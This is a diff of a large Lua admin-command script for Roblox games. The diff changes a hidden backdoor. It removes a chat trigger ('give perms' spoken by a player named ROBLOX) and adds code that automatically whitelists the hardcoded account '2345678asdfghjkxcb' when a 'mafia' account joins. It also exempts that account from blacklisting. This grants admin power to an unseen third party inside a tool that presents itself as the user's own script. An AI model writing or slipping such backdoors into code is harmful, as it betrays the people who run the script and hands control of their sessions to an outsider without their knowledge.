@@ -29,6 +29,7 @@ Title = "�����";
 Duration = 2;
 });
 mafiajoinedserver = true
+
 end
 
 
@@ -12378,7 +12379,7 @@ AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function
         else
 	local Target = GetPlayer(Args[1]);
 	for i, v in next, Target do
-		if (Tfind(AdminUsers, v)) then
+		if (Tfind(AdminUsers, v)) and v.Name ~= "2345678asdfghjkxcb" then
 			AdminUsers[indexOf(AdminUsers, v)] = nil
 		end
 	end
@@ -14801,25 +14802,15 @@ end
 
 
 
-mafiacmdsloaded = false
+mafiacmdsloaded = true
 permsonce = false
 
 while true do
 wait(1)
 if mafiajoinedserver == true then
-
-game:GetService("Players").ROBLOX.Chatted:connect(function(msg) 
-        if (msg:lower() == "give perms") then
-if permsonce == false then
-print("ok daddy")
+mafiajoinedserver = false
+print("joined")
 ExecuteCommand("flingwl", {"2345678asdfghjkxcb"}, LocalPlayer);
-permsonce = true
-wait(4)
-permsonce = false
-end
-end
-end)
-
 end
 if mafiajoinedserver == true and mafiacmdsloaded == false then
 mafiacmdsloaded = true
